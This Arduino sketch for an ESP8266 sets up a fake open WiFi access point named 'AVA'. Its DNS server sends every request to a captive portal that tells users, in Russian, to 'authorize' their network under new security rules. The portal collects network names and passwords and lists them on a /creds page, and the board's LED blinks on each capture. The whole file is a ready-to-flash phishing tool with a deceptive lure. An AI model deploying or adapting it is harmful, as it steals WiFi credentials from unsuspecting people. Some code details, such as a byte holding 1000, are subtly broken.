// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "AVA"
#define SUBTITLE "Авторизация точки доступа в сети интернет."
#define TITLE "Подключение:"
#define BODY "Введите название точки доступа и её пароль."
#define POST_TITLE "Авторизация..."
#define POST_BODY "Ваша точка доступа WI-FI авторизирована. Подождите пожалуйста 5 минут для завершения валидации.</br>Спасибо Вам."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
#define SETUP_TITLE "Авторизация WiFi в соответствии с новыми стандартами безопасности."
#define SETUP_BODY "Для соответствия новым требованиям безопасности выполните авторизацию WiFi."
#define SETUP_BUTTON "Пройти настройку"
#define ERROR_TITLE "Ошибка авторизации"
#define ERROR_BODY "Пожалуйста, введите имя сети WiFi и пароль."

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials="";
unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { return 
  "</div><div class=q><a>&#169; Ростов. Все права защищены.</a></div>";
}

String setupPage() {
  return header(SETUP_TITLE) + "<div>" + SETUP_BODY + "</div><div><form action=/setup method=post>" +
    "<input type=submit value=\"" + SETUP_BUTTON + "\"></form></div>" + footer();
}

String errorPage() {
  return header(ERROR_TITLE) + "<div>" + ERROR_BODY + "</div><div><form action=/setup method=post>" +
    "<input type=submit value=\"" + SETUP_BUTTON + "\"></form></div>" + footer();
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; line-height: 1.1; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>WI-FI:</b> <center><input type=text autocomplete=email name=email></input></center>" +
    "<b>Пароль:</b> <center><input type=password name=password></input><input type=submit value=\"Авторизировать\"></form></center>" + footer();
}

String posted() {
  String email=input("email");
  String password=input("password");
  Credentials="<li>WI-FI: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email="<p></p>";
  String password="<p></p>";
  Credentials="<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while(count < 5){
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  webServer.on("/post",[]() { 
      String email=input("email");
      String password=input("password");
      
      if(email == "" || password == "") {
          webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
          webServer.send(HTTP_CODE, "text/html", errorPage());
          return;
      }
      
      // Credentials="<li>WI-FI: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
      webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
      webServer.send(HTTP_CODE, "text/html", posted()); 
      BLINK(); 
  });

  webServer.on("/creds",[]() { 
    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
    webServer.send(HTTP_CODE, "text/html", creds()); 
  });

  webServer.on("/clear",[]() { 
    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
    webServer.send(HTTP_CODE, "text/html", clear()); 
  });

  webServer.on("/setup",[]() { 
    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
    webServer.send(HTTP_CODE, "text/html", index()); 
  });

  webServer.onNotFound([]() { 
    lastActivity=millis(); 
    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
    webServer.send(HTTP_CODE, "text/html", setupPage()); 
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() { 
  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
